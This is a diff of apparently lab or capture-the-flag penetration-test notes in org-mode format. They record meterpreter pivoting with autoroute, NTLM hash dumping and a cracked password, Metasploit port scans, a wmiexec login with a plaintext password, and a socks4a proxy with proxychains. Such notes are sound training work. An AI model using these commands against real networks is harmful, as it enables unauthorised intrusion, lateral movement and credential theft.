@@ -930,17 +930,19 @@ Interface: 10.59.3.10 --- 0x10
 10.59.3.10 -> ADMIN (.4.17)
 10.59.5.13 -> ADMIN (.4.17)
 
-How do we tunnel the traffic over meterpreter session?
+*** How do we tunnel the traffic over meterpreter session?
 https://www.blackhillsinfosec.com/use-nmap-meterpreter/
 
 added a route over meterpreter > run autoroute -s 10.59.3.0 -n 255.0.0.0
 
 hashdump on .4.17 in meterpreter: ~run hashdump~
 
+#+BEGIN_EXAMPLE
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:edc9be02e6139d22367f1c72d6486113:::
 Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 bob:1004:aad3b435b51404eeaad3b435b51404ee:d3ea06beca64d42948a2cb28f9583eb6:::
 charles:1005:aad3b435b51404eeaad3b435b51404ee:160d3cc9b153b5eb9647c768432adcf7:::
+#+END_EXAMPLE
 
 Charles password decrypts to Jasper01
 
@@ -954,20 +956,61 @@ Press 'q' or Ctrl-C to abort, almost any other key for status
 *Jasper01*         (charles)
 
 *** scan of the .3 subnet
-added a route with autoroute
-backgrounded my session
-~use auxiliary/scanner/portscan/tcp~
-~set RHOSTS 10.59.3.0-255~
-~set PORTS 22,139,445~
-~set THREADS 8~
-~run~
++ added a route with autoroute
++ backgrounded my session
++ loaded a built in port scanner and used against the newly routed subnet
+	#+BEGIN_SRC
+	use auxiliary/scanner/portscan/tcp
+	set RHOSTS 10.59.3.0-255
+	set PORTS 22,139,445
+	set THREADS 8
+	run
+	#+END_SRC
++ got the results:
+  #+BEGIN_EXAMPLE
+  [+] 10.59.3.10:           - 10.59.3.10:139 - TCP OPEN
+  [+] 10.59.3.14:           - 10.59.3.14:22 - TCP OPEN
+  [+] 10.59.3.10:           - 10.59.3.10:445 - TCP OPEN
+  [+] 10.59.3.11:           - 10.59.3.11:22 - TCP OPEN
+  [+] 10.59.3.13:           - 10.59.3.13:22 - TCP OPEN
+  #+END_EXAMPLE
 
-[+] 10.59.3.10:           - 10.59.3.10:139 - TCP OPEN
-[+] 10.59.3.14:           - 10.59.3.14:22 - TCP OPEN
-[+] 10.59.3.10:           - 10.59.3.10:445 - TCP OPEN
-[+] 10.59.3.11:           - 10.59.3.11:22 - TCP OPEN
-[+] 10.59.3.13:           - 10.59.3.13:22 - TCP OPEN
 
 Next step - set up SOCKS proxy and proxychains
 
-ssh server could be 7722
+**** NOTE! ssh server could be 7722 - doesn't show up in scan of the lower 1024 ports
+
+*** 18:05 reestablishing conection to .17
+with ~../wmiexec.py bob:Very_SafeDAPW\!@10.59.4.17~
+re-adding routes to .3 and .5 subnet:
+run autoroute -s 10.59.3.0 -n 255.0.0.0
+run autoroute -s 10.59.5.0 -n 255.0.0.0
+
+#+BEGIN_EXAMPLE
+msf5 exploit(multi/handler) > use auxiliary/scanner/portscan/tcp
+msf5 auxiliary(scanner/portscan/tcp) > set RHOSTS 10.59.5.0-255
+RHOSTS => 10.59.5.0-255
+msf5 auxiliary(scanner/portscan/tcp) > set RPORTS 22,139,445
+RPORTS => 22,139,445
+msf5 auxiliary(scanner/portscan/tcp) > set THREADS 8
+THREADS => 8
+msf5 auxiliary(scanner/portscan/tcp) > run
+#+END_EXAMPLE
+
+*** looks like time to set up a socks proxy
+
+https://www.offensive-security.com/metasploit-unleashed/proxytunnels/
+
++ Load the socks4a module
+  #+BEGIN_SRC
+  use auxiliary/server/socks4a
+  set SRVPORT 8080
+  run
+  #+END_SRC
+
++ Now let's configure proxychains to the port we defined
+  * edit ~/etc/proxychains.conf~ - changed last line to:
+  * ~socks4 	10.59.4.12 8080~
++ now we should be able to run external tools through the tunnel:
+  * ~proxychains nmap -sV 10.59.3.14~
++ 
